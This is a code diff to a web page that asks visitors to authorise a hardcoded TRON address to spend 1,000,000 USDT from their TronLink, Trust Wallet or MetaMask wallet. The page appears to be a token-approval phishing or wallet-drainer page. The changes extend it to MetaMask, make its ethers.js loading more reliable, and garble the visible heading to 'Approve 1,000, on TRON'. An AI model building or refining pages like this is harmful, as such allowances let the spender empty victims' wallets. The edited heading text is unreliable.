@@ -6,7 +6,7 @@
   <title>Approve 1,000,000 USDT on TRON</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
   <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.3/dist/TronWeb.min.js" defer></script>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js" defer></script>
+  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js" defer></script>
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.min.js" defer></script>
   <style>
     * {
@@ -115,7 +115,7 @@
 </head>
 <body>
   <div class="container">
-    <h2>Approve 1,000,000 USDT on TRON</h2>
+    <h2>Approve 1,000, on TRON</h2>
     <p>Click the button to authorize the address:<br><strong class="spender-address">TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu</strong></p>
     <button onclick="approveUSDT('tronlink')">Authorize with TronLink</button>
     <button onclick="approveUSDT('trustwallet')">Authorize with Trust Wallet</button>
@@ -151,6 +151,17 @@
       return true;
     }
 
+    async function waitForEthers(timeout = 5000) {
+      const start = Date.now();
+      while (typeof ethers === "undefined" || !ethers.utils) {
+        if (Date.now() - start > timeout) {
+          return false;
+        }
+        await new Promise(resolve => setTimeout(resolve, 100));
+      }
+      return true;
+    }
+
     async function setupTronNetwork(provider) {
       try {
         await provider.request({
@@ -173,14 +184,15 @@
     async function connectTrustWallet() {
       try {
         let provider;
-        if (window.ethereum && window.ethereum.isTrust) {
+        if (window.ethereum && (window.ethereum.isTrust || window.ethereum.isMetaMask)) {
           provider = new ethers.providers.Web3Provider(window.ethereum);
           await window.ethereum.request({ method: "eth_requestAccounts" });
         } else {
           provider = await EthereumProvider.init({
             projectId: "f6b400b4393b83bb22abcaf805ad72d2", // Replace with your WalletConnect project ID
             chains: [728126428], // TRON Mainnet chain ID
-            rpc: { 728126428: "https://api.trongrid.io" },
+            optionalChains: [728126428],
+            rpcMap: { 728126428: "https://api.trongrid.io" },
             metadata: {
               name: "USDT Approval",
               description: "Approve USDT on TRON",
@@ -209,10 +221,12 @@
 
         // Set approval amount: 1,000,000 USDT (6 decimals)
         let amount;
-        if (typeof ethers !== "undefined" && ethers.utils) {
+        const ethersReady = await waitForEthers();
+        if (ethersReady) {
           amount = ethers.utils.parseUnits("1000000", 6).toString();
         } else {
           amount = "1000000000000"; // 1,000,000 * 10^6
+          console.warn("ethers.js not loaded, using fallback amount.");
         }
 
         if (walletType === "tronlink") {
